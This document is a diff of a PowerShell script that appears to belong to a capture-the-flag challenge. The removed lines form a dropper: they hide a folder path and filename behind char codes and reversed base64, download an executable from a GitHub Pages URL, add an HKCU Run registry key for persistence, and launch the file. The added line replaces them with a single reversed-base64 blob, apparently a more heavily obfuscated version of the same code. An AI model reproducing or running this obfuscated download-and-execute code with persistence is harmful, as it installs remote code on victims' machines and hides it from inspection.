@@ -1,18 +1,1 @@
-$ttl = 67,58,92,77,105,99,114,111,115,111,102,116
-$wru = $ttl | % {[char]$_}
-$wrt = -join($wru)
-New-Item -ItemType Directory -Path $wrt -Force
-
-$hhh = "=","U","G","e","l","5","C","c","1","R","n","c","h","R","3","c"
-[array]::Reverse($hhh)
-$ggg = -join($hhh)
-$fff = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ggg))
-$fullname = $wrt+"\"+$fff
-$url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly94YW50dXMxMC5naXRodWIuaW8vQ1RGLzAyLw=="))+$fff
-Invoke-WebRequest $url -OutFile $fullname
-
-$run = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$k = $wrt[3]+$wrt[4]+$wrt[5]+$wrt[6]+$wrt[7]+$wrt[8]+$wrt[9]+$wrt[10]+$wrt[11]+$run[6]+$wrt[11]+$run[11]+$run[12]+$wrt[11]+$run[34]+"p"
-Set-ItemProperty -Path $run -Name $k -Value $fullname
-
-& ($fullname)
+==QKl1WYuxGb1ZGJoAiJK0gCNUWbh5GbsVnZkASZ1xWYW1CIrRCIl1WYO1CIuVnckACa0FGUtASe0JXZw9mcQ1WZ0lUL0V2UK0gIwJyKdRzMb5WdyRyKdFTMbRnc3RyKdJTMb5WdyRyKdFTMb5WdyRyKdFTMbRnc3RyKdZzWuVncksSXxEzW0J3dksSXwEzW0J3dksSX5sFdydHJr0FObRnc3RyKddzW0J3dksSX2sFdydHJr0VNbRnc3RyKdRzW0J3dksSXzsFdydHJg0DIrRiCNIib1JFXu9WazJXZWRnblJnc1NEXzd3bk5WaXxFdm92cvJ3Yp1EXlJXY3RnZvNFX6U1QLhkIg0DIuVnckoQDK0gYlRGJgUWdsFmVtASbhVmc0NVZ0lnQzFULgUWbh5GbsVnZkACa0FGUtACduVGdu92QtQXZTpQDpYXZyRCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvN0Wg0DIiVGZkoQDyJXYkAibp9matASPgYXZyRiCNkicyFGJoU2cyVmdlJlO60VehJncBtlCNkCK5FmcyFkchh2QvRlLjRCI9AicyFGJK0AduVGdu92QuMXZyRCI9AyYkoQDsJXdkACdzVWdxVmUiV2VtU2avZnbJBSPgMXZyRiCNoQDmZmZksSKpISP9cHT5FkeMdkUxEld4cVY1l0Vk9mUYFmb1MUT41EWkBTNXlFN5kHT20ESjBjUIFmIocmbpJHdTRjNlNXYC12byZkO60FdyVmdu92Qu0WZ0NXeTtFKn5WayR3U0V2RugjRUVlO601ZulGZvNmbF5Cd4VGVu0WZ0NXeTtFI9ACbyVHJK0gZmZGJrICXisCdydHJg0DIl1WYuxGb1ZGJK0QKpc2ZnRCKn5WayR3U0YTZzFmQt9mcGpjOdRnclZnbvNkLtVGdzl3UbhyZulmc0NFdldkL4YEVVpjOddmbpR2bj5WRuQHelRlLtVGdzl3UbBSPgYmZmRiCNkCaohGJo4WavpWLg0DInd2ZkoQDpgGaoRCKlNnclZXZSpjOdlXYyJXYbpQDiMmIsIyMiwiISJCLigmIsIyYiwiIuJCLiIlIsISMiwiIjJCLiMkIsISNiwiIsJCLiUmIsIyRiwiIVJCLi0jIg0DIohGakoQDK0QZjJ3bG1CI0J3dkACa0FGUtASey9GdjVmcpREIlBXeU1WZ0lULg0WZ0lUL3VmTK0QK1J3dkgibp9matASPgQnc3RiCN03Xk0lchh2YbtHIlACfgwGd0RCI9ASdydHJK0gNxEDLyATMsETMxwSNxEDLxETMsQTMxwSO5wSNwEDL3cDLykDL4UDL3YDI9ACb0RHJ
